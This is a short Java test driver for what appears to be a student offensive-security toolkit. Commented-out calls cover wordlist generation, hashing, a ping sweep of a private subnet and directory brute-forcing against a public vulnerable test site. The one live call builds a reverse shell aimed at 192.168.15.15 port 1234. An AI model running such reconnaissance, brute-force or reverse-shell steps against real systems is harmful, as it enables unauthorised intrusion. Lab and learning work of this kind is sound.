package proyecto;
import org.apache.commons.codec.digest.DigestUtils;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.*;

public class Tets {
    public static void main(String[] args) throws IOException, URISyntaxException, InterruptedException {
        /*
        wordlist w1 = new wordlist(100,8);
        w1.generate();
        System.out.println(w1.toString());
         */

        /*
        cipher sha1_1 = new cipher("Hello", 1);
        cipher md5_1 = new cipher("Hello", 2);
        cipher sha256_1 = new cipher("Hello", 3);

        sha1_1.cifradirijillo();
        md5_1.cifradirijillo();
        sha256_1.cifradirijillo();

        System.out.println("Sha1 " + sha1_1);
        System.out.println("MD5 " + md5_1);
        System.out.println("Sha256 " + sha256_1);
         */

        /*
        StringBuilder IP= new StringBuilder("192.168.10.0");
        int lastIndex;
        for(int i=1;i<=254;i++) {
        lastIndex = IP.lastIndexOf(".");
        IP.delete(lastIndex+1, IP.length());
        IP.append(i);
        System.out.println(IP);
        }
        */

        /*
        pingsweep ping1 = new pingsweep(new StringBuilder("192.168.15.0"),254);
        ping1.ping();
        */

        /*
        //discovery d1 = new discovery("https://postman-echo.com");
        discovery d1 = new discovery("http://testphp.vulnweb.com");
        d1.bruteforce();
         */

        shells s1 = new shells(1,"192.168.15.15","1234");
        s1.shellify();
        System.out.println(s1);
    }
}